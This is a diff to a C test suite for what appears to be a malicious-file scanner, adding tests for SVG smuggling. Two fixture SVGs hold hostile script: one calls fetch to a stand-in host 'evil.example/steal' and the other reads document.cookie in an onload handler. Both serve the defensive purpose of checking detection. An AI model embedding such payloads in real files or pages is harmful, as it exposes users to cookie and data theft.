@@ -190,6 +190,59 @@ static void test_polyglot_gif_exe(void) {
     cleanup();
 }
 
+static void test_scripted_svg_script_tag(void) {
+    setup();
+    /* SVG carrying a <script> element — SVG-smuggling (2026 top vector) */
+    const char *svg =
+        "<?xml version=\"1.0\"?>\n"
+        "<svg xmlns=\"http://www.w3.org/2000/svg\">"
+        "<script>fetch('//evil.example/steal')</script></svg>\n";
+    create("logo.svg", svg, strlen(svg));
+    char path[512];
+    snprintf(path, sizeof(path), "%s/logo.svg", tmpdir);
+
+    TEST("File: scripted SVG (<script>) → F5 flagged");
+    FileVerdict v = hlse_check_file(path);
+    if (v.score >= 40) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    cleanup();
+}
+
+static void test_scripted_svg_onload(void) {
+    setup();
+    /* SVG carrying an inline event handler — also smuggling */
+    const char *svg =
+        "<svg onload=\"alert(document.cookie)\" "
+        "xmlns=\"http://www.w3.org/2000/svg\"></svg>\n";
+    create("pic.svg", svg, strlen(svg));
+    char path[512];
+    snprintf(path, sizeof(path), "%s/pic.svg", tmpdir);
+
+    TEST("File: scripted SVG (onload=) → F5 flagged");
+    FileVerdict v = hlse_check_file(path);
+    if (v.score >= 40) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    cleanup();
+}
+
+static void test_benign_svg_ok(void) {
+    setup();
+    /* A genuine chart SVG with no script — must NOT be flagged */
+    const char *svg =
+        "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 10 10\">"
+        "<rect width=\"10\" height=\"10\" fill=\"blue\"/>"
+        "<path d=\"M0 0 L10 10\"/></svg>\n";
+    create("chart.svg", svg, strlen(svg));
+    char path[512];
+    snprintf(path, sizeof(path), "%s/chart.svg", tmpdir);
+
+    TEST("File: benign SVG (no script) → not flagged");
+    FileVerdict v = hlse_check_file(path);
+    if (v.score < 40) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    cleanup();
+}
+
 static void test_real_gif_ok(void) {
     setup();
     /* Genuine GIF as .gif — must NOT be flagged */
@@ -554,6 +607,9 @@ int main(void) {
     test_macho_dylib_ok();
     test_real_pdf();
     test_polyglot_gif_exe();
+    test_scripted_svg_script_tag();
+    test_scripted_svg_onload();
+    test_benign_svg_ok();
     test_real_gif_ok();
     test_ole_with_vba();
     test_7zip_disguised_as_exe();
